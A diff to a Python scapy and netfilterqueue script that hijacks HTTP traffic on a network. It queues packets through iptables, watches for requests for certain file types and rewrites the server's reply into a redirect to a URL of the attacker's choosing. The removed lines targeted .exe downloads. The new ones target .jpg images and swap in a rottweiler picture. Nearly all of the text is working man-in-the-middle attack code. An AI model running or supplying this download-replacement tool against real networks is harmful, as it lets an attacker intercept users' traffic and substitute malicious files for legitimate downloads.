@@ -8,7 +8,7 @@
         iptables -I INPUT -j NFQUEUE --queue-num 1
         iptables -I OUTPUT -j NFQUEUE --queue-num 1
     * Example HTTP site for testing:
-        http://www.oldversion.com/windows/download/winzip-17-0-10381
+        http://www.bigfoto.com/
 """
 from os import getuid
 from sys import exit
@@ -20,8 +20,11 @@ from scapy.layers.inet import IP, UDP, TCP
 from scapy.compat import raw
 import netfilterqueue
 
+FILE_EXT = b".jpg"
 CUSTOM_LOAD = (b"HTTP/1.1 301 Moved Permanently\r\n"
-               b"Location: http://www.bigfoto.com/lines-image.jpg\n\n")
+    b"Location: http://www.pets4homes.co.uk/images/articles/"
+    b"1695/large/the-pros-and-cons-of-keeping-a-rottweiler-as-a-pet-5389cba92bfaf.jpg\n\n")
+LOAD_KEYWORD = b"rottweiler"
 ACK_LIST = []
 
 def enable_iptable_queue():
@@ -49,17 +52,14 @@ def process_packet(pkt):
         raw_layer = scapy_pkt.getlayer(Raw).load if scapy_pkt.haslayer(Raw) else None
         # If destination port is port 80, most likely a HTTP request, else HTTP response
         if(tcp.dport == 80 and raw_layer):
-            if(b".exe" in raw_layer):
+            if(FILE_EXT in raw_layer and LOAD_KEYWORD not in raw_layer):
                 ACK_LIST.append(tcp.ack)
-                print("[+] Someone is trying to download a .exe file")
         elif(tcp.sport == 80 and (tcp.seq in ACK_LIST) and raw_layer):
-            print("[+] Replacing download with custom payload")
             ACK_LIST.remove(tcp.seq)
             scapy_pkt = set_load(scapy_pkt, CUSTOM_LOAD)
             # Use the class instance to recalculate the chksum and len fields for us
             # Accepts a packet in bytes format, then casted back into bytes for payload
             scapy_pkt = raw(scapy_pkt.__class__(raw(scapy_pkt)))
-            print(scapy_pkt)
             # Update the current packets payload with the payload of our spoofed one
             pkt.set_payload(scapy_pkt)
 
